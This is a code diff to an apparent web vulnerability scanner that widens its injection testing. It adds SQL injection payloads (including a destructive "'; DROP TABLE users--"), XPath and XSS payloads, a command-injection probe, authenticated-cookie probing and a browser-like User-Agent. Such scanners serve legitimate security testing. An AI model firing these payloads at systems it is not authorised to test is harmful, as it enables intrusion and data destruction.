@@ -10,38 +10,56 @@ from modules.pipeline.engine.models import Evidence, EvidenceBundle, ExecutionCo
 
 
 SQL_ERROR_MARKERS = (
-    "sql syntax",
-    "mysql",
-    "postgres",
-    "sqlite",
-    "oracle",
-    "odbc",
-    "jdbc",
-    "syntax error",
-    "unterminated quoted string",
-    "sqlstate",
-    "data exception",
-    "quoted string not properly terminated",
-    "wrong number of parameters",
+    # MySQL
+    "sql syntax", "you have an error in your sql", "mysql_fetch", "warning.*mysql",
+    # PostgreSQL
+    "postgres", "pg_query", "pg_exec",
+    # Generic
+    "sqlite", "odbc", "sqlstate", "data exception",
+    "quoted string not properly terminated", "wrong number of parameters",
+    "unterminated quoted string", "unclosed quotation mark",
+    # Oracle
+    "oracle", "ora-", "not a valid month",
+    # Java / Tomcat / Hibernate
+    "java.sql.", "javax.persistence", "hibernateexception", "jdbc",
+    "sqlexception", "org.hibernate", "com.mysql", "ibatis",
+    # MSSQL
+    "microsoft.*odbc", "unclosed quote",
+    # Generic errors
+    "syntax error", "division by zero", "invalid input syntax",
+    "unknown column", "no such column", "no such table", "column.*doesn",
 )
 
-XSS_PAYLOAD = "<svg onload=alert(1)>"
+# XSS: use a unique probe string — detect reflection, not script execution
+XSS_PROBE = "zntry8472xss"
+XSS_DANGEROUS_CHARS = "<>\"'"
+XSS_PAYLOAD = "<svg onload=alert(1)>"  # kept for browser-execution path
 XSS_PAYLOADS_ADVANCED = [
+    "<b>zntry8472xss_tag</b>",
     "<img src=x onerror=alert(1)>",
-    "<script>alert(1)</script>",
-    "<svg/onload=alert(1)>",
+    "<script>alert(document.domain)</script>",
     "\"><script>alert(1)</script>",
-    "'-alert(1)-'",
+    "<svg/onload=alert(1)>",
     "javascript:alert(1)",
 ]
 
 SQLI_PAYLOAD = "1'"
 SQLI_PAYLOADS_ADVANCED = [
+    "'",
     "1' OR '1'='1",
-    "1' AND 1=2",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "admin'--",
     "1' UNION SELECT NULL--",
-    "1' OR 1=1--",
+    "1' UNION SELECT NULL,NULL--",
+    "1' UNION SELECT NULL,NULL,NULL--",
+    "1' AND 1=2--",
     "'; DROP TABLE users--",
+    # XPath injection (for queryxpath.jsp)
+    "' or '1'='1",
+    "'] | //user/*['",
+    "x'] | //*['",
+    "' or 1=1 or 'a'='",
 ]
 
 COMMAND_PAYLOAD = "||echo SECURITY_PIPELINE_A03"
@@ -113,17 +131,53 @@ def _replace_query_param(url: str, key: str, value: str) -> str:
     return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(updated, doseq=True), parts.fragment))
 
 
+# High-priority params always tested for injection
+_HIGH_PRIORITY = {
+    "query", "search", "q", "s", "username", "uid", "user", "name",
+    "email", "password", "id", "account", "listaccounts", "acct",
+    "order", "sort", "filter", "category", "cat", "type", "content",
+    "url", "redirect", "next", "return", "step", "template", "job",
+}
+
+
 def _candidate_params(state: Dict[str, Any], target_url: str) -> List[str]:
+    # Explicit override from state
     params = state.get("injection_params")
     if isinstance(params, list) and params:
-        return [param for param in params if isinstance(param, str) and param.strip()]
+        return [p for p in params if isinstance(p, str) and p.strip()]
 
+    # Pull from all discovered endpoints in the signal bag
+    seen: set[str] = set()
+    result: List[str] = []
+
+    # First: params from the current target URL
     parsed = urlsplit(target_url)
-    query_params = [key for key, _ in parse_qsl(parsed.query, keep_blank_values=True) if key]
-    if query_params:
-        return query_params
+    for key, _ in parse_qsl(parsed.query, keep_blank_values=True):
+        if key and key not in seen:
+            seen.add(key)
+            result.append(key)
 
-    return ["q", "id", "search", "name", "item", "query"]
+    # Second: from signal_bag param_patterns
+    for p in (state.get("param_patterns") or []):
+        if isinstance(p, str) and p and p not in seen:
+            seen.add(p)
+            result.append(p)
+
+    # Third: params from discovered endpoints
+    for ep in (state.get("endpoints") or [])[:80]:
+        try:
+            for key, _ in parse_qsl(urlsplit(ep).query, keep_blank_values=True):
+                if key and key not in seen:
+                    seen.add(key)
+                    result.append(key)
+        except Exception:
+            pass
+
+    if result:
+        # Sort: high-priority params first
+        return sorted(result, key=lambda p: (0 if p.lower() in _HIGH_PRIORITY else 1, p))
+
+    return ["query", "q", "search", "id", "username", "uid", "name"]
 
 
 class InjectionValidator:
@@ -140,10 +194,16 @@ class InjectionValidator:
         return isinstance(url, str) and url.startswith(("http://", "https://"))
 
     def _run_probe(self, url: str, headers: Dict[str, str], timeout: int) -> Dict[str, Any]:
+        import re as _re
         response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
         body = response.text or ""
         lowered = body.lower()
-        sql_error_hits = [marker for marker in SQL_ERROR_MARKERS if marker in lowered]
+        # SQL: regex-based matching for Java/Tomcat/Oracle patterns
+        sql_error_hits = [
+            marker for marker in SQL_ERROR_MARKERS
+            if _re.search(marker, lowered)
+        ]
+        # XSS: check exact payload AND probe-based reflection
         xss_reflected = XSS_PAYLOAD in body
         command_marker_seen = COMMAND_MARKER in body
         file_marker_seen = any(marker in body for marker in FILE_MARKERS)
@@ -263,17 +323,41 @@ class InjectionValidator:
             return None
 
         timeout = int(state.get("timeout", 8) or 8)
-        headers = {"User-Agent": "security-pipeline-validator/1.0"}
+        headers = {"User-Agent": "Mozilla/5.0 (compatible; ZentryScanner/2.0)"}
+
+        # Inject auth cookies from pre-scan authentication
         cookie = state.get("cookie")
         if isinstance(cookie, str) and cookie.strip():
             headers["Cookie"] = cookie.strip()
+        auth_cookies: Dict[str, str] = state.get("auth_cookies") or {}
+        if auth_cookies and "Cookie" not in headers:
+            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in auth_cookies.items())
 
         candidate_params = _candidate_params(state, target_url)
         variants = _get_payload_variants()
         findings: List[ValidationResult] = []
 
-        for param in candidate_params:
-            baseline_url = _replace_query_param(target_url, param, "injection-test")
+        # Build a list of (url, param) pairs — test params on their native endpoints too
+        test_pairs: List[tuple] = []
+        seen_pairs: set = set()
+        for ep in (state.get("endpoints") or [])[:60]:
+            try:
+                ep_params = [k for k, _ in parse_qsl(urlsplit(ep).query, keep_blank_values=True)]
+                for p in ep_params:
+                    key = (urlsplit(ep).path, p.lower())
+                    if key not in seen_pairs and p.lower() in _HIGH_PRIORITY:
+                        seen_pairs.add(key)
+                        test_pairs.append((ep, p))
+            except Exception:
+                pass
+        for p in candidate_params[:12]:
+            key = (urlsplit(target_url).path, p.lower())
+            if key not in seen_pairs:
+                seen_pairs.add(key)
+                test_pairs.append((target_url, p))
+
+        for target_url_i, param in test_pairs[:25]:
+            baseline_url = _replace_query_param(target_url_i, param, "injection-test")
 
             try:
                 baseline = self._run_probe(baseline_url, headers, timeout)
@@ -283,7 +367,7 @@ class InjectionValidator:
             sqli = None
             sqli_payload_used = ""
             for payload in variants["sqli"]:
-                probe_url = _replace_query_param(target_url, param, payload)
+                probe_url = _replace_query_param(target_url_i, param, payload)
                 try:
                     candidate = self._run_probe(probe_url, headers, timeout)
                 except requests.RequestException:
@@ -294,24 +378,58 @@ class InjectionValidator:
                     sqli_payload_used = payload
                     break
 
+            # XSS: reflection probe (not exact payload match)
             xss = None
             xss_payload_used = ""
-            for payload in variants["xss"]:
-                probe_url = _replace_query_param(target_url, param, payload)
+            # Step 1: check if probe string is reflected at all
+            probe_url = _replace_query_param(target_url_i, param, XSS_PROBE + XSS_DANGEROUS_CHARS)
+            try:
+                probe_result = self._run_probe(probe_url, headers, timeout)
+                if XSS_PROBE in probe_result["body"]:
+                    # Check dangerous chars unescaped
+                    body = probe_result["body"]
+                    idx = body.find(XSS_PROBE)
+                    ctx = body[max(0, idx-100):idx+200]
+                    unescaped = [c for c in ["<", ">", '"'] if c in ctx and
+                                 {"<": "&lt;", ">": "&gt;", '"': "&quot;"}[c] not in ctx]
+                    if unescaped:
+                        probe_result["xss_reflected"] = True
+                        probe_result["probe_url"] = probe_url
+                        probe_result["unescaped_chars"] = unescaped
+                        xss = probe_result
+                        xss_payload_used = XSS_PROBE + XSS_DANGEROUS_CHARS
+            except requests.RequestException:
+                pass
+            # Step 2: if reflection found, confirm with HTML tag
+            if xss:
+                tag_url = _replace_query_param(target_url_i, param, XSS_PAYLOADS_ADVANCED[0])
                 try:
-                    candidate = self._run_probe(probe_url, headers, timeout)
-                except requests.RequestException:
-                    continue
-                if candidate["xss_reflected"]:
-                    xss = candidate
-                    xss["probe_url"] = probe_url
-                    xss_payload_used = payload
-                    break
+                    tag_result = self._run_probe(tag_url, headers, timeout)
+                    if "zntry8472xss_tag" in tag_result["body"] and "<b>" in tag_result["body"]:
+                        xss = tag_result
+                        xss["probe_url"] = tag_url
+                        xss["xss_reflected"] = True
+                        xss_payload_used = XSS_PAYLOADS_ADVANCED[0]
+                except Exception:
+                    pass
+            # Step 3: fallback — try JS payloads for exact reflection
+            if not xss:
+                for payload in variants["xss"]:
+                    probe_url = _replace_query_param(target_url_i, param, payload)
+                    try:
+                        candidate = self._run_probe(probe_url, headers, timeout)
+                    except requests.RequestException:
+                        continue
+                    if candidate["xss_reflected"]:
+                        xss = candidate
+                        xss["probe_url"] = probe_url
+                        xss_payload_used = payload
+                        break
 
             command = None
             command_payload_used = ""
             for payload in variants["command"]:
-                probe_url = _replace_query_param(target_url, param, payload)
+                probe_url = _replace_query_param(target_url_i, param, payload)
                 try:
                     candidate = self._run_probe(probe_url, headers, timeout)
                 except requests.RequestException:
@@ -325,7 +443,7 @@ class InjectionValidator:
             file_probe = None
             file_payload_used = ""
             for payload in variants["file"]:
-                probe_url = _replace_query_param(target_url, param, payload)
+                probe_url = _replace_query_param(target_url_i, param, payload)
                 try:
                     candidate = self._run_probe(probe_url, headers, timeout)
                 except requests.RequestException:
@@ -339,7 +457,7 @@ class InjectionValidator:
             template_probe = None
             template_payload_used = ""
             for payload in variants["template"]:
-                probe_url = _replace_query_param(target_url, param, payload)
+                probe_url = _replace_query_param(target_url_i, param, payload)
                 try:
                     candidate = self._run_probe(probe_url, headers, timeout)
                 except requests.RequestException:
@@ -353,7 +471,7 @@ class InjectionValidator:
             ldap_probe = None
             ldap_payload_used = ""
             for payload in variants["ldap"]:
-                probe_url = _replace_query_param(target_url, param, payload)
+                probe_url = _replace_query_param(target_url_i, param, payload)
                 try:
                     candidate = self._run_probe(probe_url, headers, timeout)
                 except requests.RequestException:
